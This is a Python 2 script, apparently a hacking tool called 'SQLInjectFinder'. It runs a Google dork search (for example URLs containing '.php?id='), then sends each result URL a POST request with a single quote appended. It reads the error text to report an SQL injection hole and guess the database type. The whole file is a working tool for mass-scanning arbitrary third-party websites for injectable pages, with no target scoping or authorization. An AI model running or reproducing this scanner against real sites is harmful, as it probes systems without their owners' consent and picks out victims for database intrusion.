#!/usr/bin/python2
"""Declaring colors"""
colors = {
    'FAIL': '\033[91m',
    'BOLD': '\033[1m',
    'OKGREEN': '\033[92m'
}

try:
    from googlesearch.googlesearch import GoogleSearch
except ImportError, e:
    print '{}{}[!] google-search not found ~[#] {}'.format(colors['BOLD'], colors['FAIL'], e)

try:
    import requests
except ImportError, e:
    print '{}{}[!] requests not found ~[#] {}'.format(colors['BOLD'], colors['FAIL'], e)

import argparse

class InjectFinder:

    def __init__(self, dork, num_results):
        self.dork = dork
        self.num_results = num_results
        self.logo()
        self.seacrh()

    def seacrh(self):
        response = GoogleSearch().search(self.dork, self.num_results)
        for result in response.results:
            url = result.url
            self.validator(url)

    def validator(self, url):
        check = "'"
        print 'Testing %s' % (url)
        checker = requests.post(url + check)
        if "MySQL" in checker.text:
            print "{}[*] SQL iNjection Found > Database type: MySQL {}".format(colors['OKGREEN'], colors['BOLD'])
        elif "native client" in checker.text:
            print "{}[*] SQL iNjection Found > Database type: MSSQL {}".format(colors['OKGREEN'], colors['BOLD'])
        elif "syntax error" in checker.text:
            print "{}[*] SQL iNjection Found > Database type: PostGRES {}".format(colors['OKGREEN'], colors['BOLD'])
        elif "ORA" in checker.text:
            print "{}[*] SQL iNjection Found > Database type: Oracle {}".format(colors['OKGREEN'], colors['BOLD'])
        elif "MariaDB" in checker.text:
            print "{}[*] SQL iNjection Found > Database type: MariaDB {}".format(colors['OKGREEN'], colors['BOLD'])
        elif "You have an error in your SQL syntax;" in checker.text:
            print "{}[*] SQL iNjection Found > Database type: None !".format(colors['FAIL'], colors['BOLD'])
        else:
            print "[!] Oops SQL iNjection Not Found !".format(colors['FAIL'], colors['BOLD'])
    def logo(self):
        print """{}{}
         __    ____  __   _____        _   ___ _           _           
/ _\  /___ \/ /   \_   \_ __  (_) / __(_)_ __   __| | ___ _ __ 
\ \  //  / / /     / /\/ '_ \ | |/ _\ | | '_ \ / _` |/ _ \ '__|
_\ \/ \_/ / /___/\/ /_ | | | || / /   | | | | | (_| |  __/ |   
\__/\___,_\____/\____/ |_| |_|/ \/    |_|_| |_|\__,_|\___|_|   
                            |__/                               


        """.format(colors['BOLD'], colors['FAIL'])

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('dork', help='ex: inurl:".php?id="')
    parser.add_argument('result_count', type=int)
    args = parser.parse_args()

    """Start Search"""
    print '{}[*]Starting Query...\n'.format(colors['FAIL'])
    InjectFinder(args.dork, args.result_count)

if __name__ == '__main__':
    main()